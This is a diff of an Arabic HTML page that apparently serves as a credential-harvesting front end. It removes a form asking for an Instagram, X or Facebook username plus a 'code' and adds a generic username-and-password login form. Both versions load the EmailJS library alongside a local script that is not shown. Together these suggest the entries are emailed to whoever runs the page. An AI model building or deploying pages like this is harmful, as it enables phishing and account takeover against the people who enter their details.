@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة ترحيبية</title>
+    <title>تسجيل الدخول</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -17,49 +17,17 @@
             height: 100vh;
         }
 
-        .welcome-container {
+        .login-container {
             text-align: center;
-            max-width: 600px;
-            margin: 20px;
             background-color: white;
             padding: 20px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             border-radius: 10px;
-        }
-
-        .welcome-img {
-            width: 100%;
-            height: auto;
-            border-radius: 10px;
+            width: 300px;
         }
 
         h1 {
             color: #333;
-        }
-
-        .platforms {
-            margin-top: 20px;
-        }
-
-        .platform-btn {
-            background-color: #008CBA;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            margin: 5px;
-            cursor: pointer;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-
-        .platform-btn:hover {
-            background-color: #005f75;
-        }
-
-        .form-container {
-            display: none;
-            margin-top: 20px;
-            text-align: left;
         }
 
         form input {
@@ -86,31 +54,17 @@
     </style>
 </head>
 <body>
-    <div class="welcome-container">
-        <img src="welcome-image.jpg" alt="https://github.com/SWE-M/formsubmit/blob/main/48b04dce-b281-40a5-9fc2-510e026c751f_rw_1920.gif" class="welcome-img">
-        <h1>مرحباً بك في موقعنا!</h1>
-        <p>نحن سعيدون بانضمامك إلينا. يرجى اختيار المنصة للانضمام لنا.</p>
 
-        <div class="platforms">
-            <button class="platform-btn" onclick="showForm('instagram')">انستقرام</button>
-            <button class="platform-btn" onclick="showForm('x')">إكس</button>
-            <button class="platform-btn" onclick="showForm('facebook')">فيسبوك</button>
-        </div>
-
-        <div id="platform-form" class="form-container">
-            <form id="user-form">
-                <label for="username">أدخل اسم المستخدم:</label>
-                <input type="text" id="username" name="username" required>
-
-                <label for="code">أدخل الرمز:</label>
-                <input type="text" id="code" name="code" required>
-
-                <button type="submit">إرسال</button>
-            </form>
-        </div>
+    <div class="login-container">
+        <h1>تسجيل الدخول</h1>
+        <form id="login-form">
+            <input type="text" id="username" name="username" placeholder="اسم المستخدم" required>
+            <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
     </div>
 
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script src="script.js"></script>
+    <script src="login.js"></script>
 </body>
 </html>
